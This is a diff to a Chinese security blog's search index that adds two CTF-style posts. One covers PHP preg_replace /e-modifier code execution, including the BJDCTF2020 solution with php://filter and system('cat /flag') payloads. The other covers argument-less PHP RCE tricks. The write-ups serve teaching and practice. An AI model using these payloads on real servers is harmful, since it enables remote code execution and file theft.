@@ -278,6 +278,65 @@
       </tags>
   </entry>
   <entry>
+    <title>preg_match e模式下的代码执行漏洞</title>
+    <url>/2022/06/09/preg-match-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="preg-match-e-模式下的代码执行漏洞"><a href="#preg-match-e-模式下的代码执行漏洞" class="headerlink" title="preg_match e 模式下的代码执行漏洞"></a>preg_match e 模式下的代码执行漏洞</h1><h2 id="漏洞可利用php版本"><a href="#漏洞可利用php版本" class="headerlink" title="漏洞可利用php版本"></a>漏洞可利用php版本</h2><ul>
+<li><p>php 3.x版本可无报错利用</p>
+</li>
+<li><p>php 5.x版本虽然会报错 但是仍然可以利用 </p>
+</li>
+<li><p>php 7.x版本后不再可用</p>
+</li>
+</ul>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>对于php正则使用最多的函数就是preg_match()  该函数有许多可用模式 比如最常见的i模式 即不区分大小写 本次漏洞所用的为e模式 那么什么是e模式</p>
+<ul>
+<li>preg_match 的e模式</li>
+</ul>
+<p>preg_match(par1,par2,par3) 参数1为正则匹配部分 参数2为正则替换部分 参数3为被检索字符串 开启e模式后可以使用==反向引用==功能 ==并且par2会被当成php代码执行==</p>
+<p>==什么是反向引用==</p>
+<p>对一个正则表达式模式或部分模式 两边添加圆括号会导致 如果被匹配字符串中的某一部分被成功匹配（这里记该部分字符串为b）则会将b存储到一个临时缓冲区中 所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储 缓冲区编号从 1 开始 最多可存储 99 个捕获的子表达式 每个缓冲区都可以使用 ‘\n’ 访问 其中 n 为一个标识特定缓冲区的一位或两位十进制数 并且后续还需要用到b 那么就可以使用反向引用调用b</p>
+<p>放一段代码</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到上面的正则中 $re 和 $str 可以通过遍历$_GET从而被客户端控制 并且该正则开启了e模式</p>
+<p>当我们以get方式传入以下payload时</p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>超全局变量$_GET 以数组形式储存 键名为get传参的参数 键值为传参的值 所以数组中第一个键为</p>
+<p><code>\S*==&gt;$&#123;getFlag()&#125;</code></p>
+<p>经过foreach变量后 re的值为\S*  str的值为${getFlag()}</p>
+<p>所以正则被替换为</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . \S* . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $&#123;<span class="title function_ invoke__">getFlag</span>()&#125;</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<p>此时的正则匹配部分为<code>\S* </code> 也就是所有非空白字符 被匹配字符串为<code>$&#123;getFlag()&#125;</code> 这样匹配<code>$&#123;getFlag()&#125;</code>是一定会被匹配到的 并且因为前面的<code>\S*</code>加了括号 所以导致了反向引用 导致<code>$&#123;getFlag()&#125;</code>被存入缓冲区 并且可以被调用 再看第二个参数<code>strtolower(&quot;\\1&quot;)</code> 第一个反斜线是转义用的 所以其实就是<code>strtolower(&quot;\1&quot;)</code> 上面提到被反向引用的字符串存入缓冲区后可以使用<code>\n</code>的方式调用 所以这里就调用了刚才存入缓冲区的<code>$&#123;getFlag()&#125;</code> 并且被当成php代码解析 其中的getFlag()函数被解析从而达到目的 由于php只对变量名区分大小写 所以即使strtolower后函数也可以被成功调用s</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里考伪协议</p>
+<p>注意 一个点 text 在file_get_scontents中作为一个文件打开 对文件写入要使用伪协议 这里可用data伪协议或者php伪协议对text写入 然后用php伪协议看一下next.php 源码（直接包含啥信息都没有）</p>
+<p>payload1</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">?text=data:<span class="comment">//text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br></pre></td></tr></table></figure>
+
+<p>payload2</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">?text=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST    I have a dream</span><br></pre></td></tr></table></figure>
+
+<p>base64解码后拿到next.php源码</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>解题步骤和漏洞原理相同 最终构造出的payload为</p>
+<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>网安</category>
+      </categories>
+      <tags>
+        <tag>标签2</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>动态网页基础原理-CGI</title>
     <url>/2022/04/26/%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86-CGI/</url>
     <content><![CDATA[<h1 id="动态网页基础原理-CGI"><a href="#动态网页基础原理-CGI" class="headerlink" title="动态网页基础原理-CGI"></a>动态网页基础原理-CGI</h1><p>以下内容来源于 <a href="https://mp.weixin.qq.com/s/BHYQNDcXXXr7U04lWwQdrg">全面了解CGI、FastCGI、PHP-FPM (qq.com)</a> 想看原文请移步 下面是我自己的总结和扩充</p>
@@ -349,6 +408,42 @@
       <tags>
         <tag>php</tag>
         <tag>CGI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>无参rce总结</title>
+    <url>/2022/06/09/%E6%97%A0%E5%8F%82rce%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h1><p><strong>之前假期做题的时候做到过一次无参rce 但是当时水平不太够很多地方都看不懂 今天正好又遇到了就总结一下</strong></p>
+<h2 id="什么是无参RCE"><a href="#什么是无参RCE" class="headerlink" title="什么是无参RCE"></a>什么是无参RCE</h2><p>先看一段正则</p>
+<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; </span><br><span class="line"> 		     <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>看着很乱 一点点分析一下</strong></p>
+<p><strong>最外层的引号和一对//就不多说了 正则表达的框架</strong></p>
+<h6 id="W-W-表示除了-数字字母下划线-以外的字符-前面有个-表示对该结果集进行取反-也就是数字字母下划线-等同于-w-这里注意-这个符号在-外面表示正则开始的位置-而在-里面则表示对后面的正则结果进行去反-也就是取补集"><a href="#W-W-表示除了-数字字母下划线-以外的字符-前面有个-表示对该结果集进行取反-也就是数字字母下划线-等同于-w-这里注意-这个符号在-外面表示正则开始的位置-而在-里面则表示对后面的正则结果进行去反-也就是取补集" class="headerlink" title="[^/W]  ==/W==表示除了 数字字母下划线 以外的字符 前面有个==^==表示对该结果集进行取反 也就是数字字母下划线 等同于/w 这里注意==^== 这个符号在[]外面表示正则开始的位置 而在[]里面则表示对后面的正则结果进行去反 也就是取补集"></a><strong>[^/W]</strong>  ==/W==表示除了 数字字母下划线 以外的字符 前面有个==^==表示对该结果集进行取反 也就是数字字母下划线 等同于/w 这里注意==^== 这个符号在[]外面表示正则开始的位置 而在[]里面则表示对后面的正则结果进行去反 也就是取补集</h6><p><strong><code>+</code>  量词 表示前面的正则匹配一次或多次 那么<code>[^/W]+</code>就表示匹配多个数字字母下划线 如果没有+ 那么匹配的只有一个字节 比如   <code>a    b   _    1</code>       有了+量词之后 就可以匹配单词或多个字节组成的词  比如<code>y1zh3e7</code></strong></p>
+<p><strong>\  转义符 不要因为正则太复杂懵了 后面的转义也是 也就是说明这对括号==(==<code>(?R)?\</code>==)== 就是一对括号 没别的意思 注意这对括号里的正则是作用在这个括号里 后面提到的递归也就是对括号里的内容进行递归匹配</strong> </p>
+<p><strong>(?R)   这个地方比较难理解 可以直接记住 (?R)是整个正则表达式 也就是<code>[^\W]+\((?R)?\)</code></strong> </p>
+<p><strong>?        代表将前面的正则进行贪婪匹配 看一下前面的正则是什么 (?R) 是整个正则表达式 也就是再次进行相同的匹配 也就是递归</strong></p>
+<p><strong>那么梳理一下逻辑 前面的<code>[^/W]</code>代表可以输一个词组 后面的括号里不能输入任何数字字母下划线 也就是说exp的赋值只能是一个没有参数的函数 所以这里就引出了无参RCE</strong></p>
+<p><strong>举个例子 exp 可以是 <code>a(b(c()d()))</code></strong> </p>
+<p><strong>这里有人可能会问了 这个<code>a()</code> 里面难道不是有<code>b(c()d())</code> 吗 同理b也是 为什么可以绕过呢</strong></p>
+<p><strong>首先我们要明确一个点 正则匹配是从左到右对参数进行匹配 并且只有在一个完整的匹配后才会继续进行匹配 那么上面这个参数中 第一个完整的匹配是哪个呢 应该是<code>c()</code> 而第二个应该是<code>d()</code>  因为匹配到这里的时候a和b的右面的一半括号还没有匹配到 也就是说现在匹配到的a和b其实是 <code>a(</code> 和  <code>b(</code>  并不是一个完整的正则  所以先替换为空的就是<code>c()和d()</code> 最终不断递归把a也吃掉了 所以绕过的方法就是使用php中的无参函数进行绕过</strong></p>
+<h2 id="姿势1-amp-姿势2"><a href="#姿势1-amp-姿势2" class="headerlink" title="姿势1&amp;姿势2"></a>姿势1&amp;姿势2</h2><h3 id="getallheaders-amp-get-defined-vars"><a href="#getallheaders-amp-get-defined-vars" class="headerlink" title="getallheaders()&amp;get_defined_vars()"></a>getallheaders()&amp;get_defined_vars()</h3><p><strong>getallheaders 这个函数有一些限制条件 必须是服务器为apache时才可以使用 它可以以数组形式返回http头 那么我们在burp中通过增加或修改请求头的方式就可以返回一些恶意构造的代码 如果这时程序中正好有一个可用的后门 就可以直接执行</strong></p>
+<p><strong>get_defined_vars() 与上一个类似 但是没有了apache的局限条件 它可以获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组 我们利用<code>GET</code>方式传入的参数在第一个数组中 这里我们就需要先将二维数组转换为一维数组 这里我们用到<code>current()</code>函数 这个函数的作用是返回数组中的当前单元 而它的默认是第一个单元 也就是我们GET方式传入的参数 所以局限性就是只能在get传参时和current()搭配使用</strong></p>
+<h2 id="姿势3"><a href="#姿势3" class="headerlink" title="姿势3"></a>姿势3</h2><h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h2><p><strong>原理是通过highlight_file进行源码读取 如果该文件代码包含了flag文件 那么就可以直接读取flag了</strong></p>
+<p><strong>首先 由于php并不会自动开启session 所以要自己开启一个session对话</strong> </p>
+<p><strong>session_start()</strong></p>
+<p><strong>这个方法的可控参数是Cookie中的SESSID 当session_start 后就会产生一个SESSID  在包文中可以我们自己进行修</strong>改</p>
+<p><strong>payload: <code>highlight_file(session_id(session_start))</code></strong></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>以上就是对无参rce的总结 不同环境应用的函数不同 从本质上来说就是应用无参函数进行rce</strong></p>
+<p><strong>详细例子移步<a href="https://www.cnblogs.com/pursue-security/p/15406272.html#_label1_1">RCE篇之无参数rce - 学安全的小白 - 博客园 (cnblogs.com)</a></strong></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>标签2</tag>
+        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
